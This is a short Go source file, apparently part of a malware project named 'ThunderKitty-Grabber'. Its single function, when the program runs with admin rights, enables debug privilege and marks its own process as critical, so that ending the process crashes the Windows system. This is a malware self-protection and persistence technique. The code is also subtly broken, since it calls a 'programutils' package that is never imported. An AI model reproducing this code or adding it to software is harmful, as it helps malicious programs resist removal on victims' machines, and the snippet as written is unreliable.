package CriticalProcess

import (
	Persistence "ThunderKitty-Grabber/utils/persistence"
	"github.com/EvilBytecode/GoDefender/Process/CriticalProcess"
)

func Set() {
	if Persistence.IsAdmin() {
		programutils.SetDebugPrivilege()
		programutils.SetProcessCritical()
	}
}
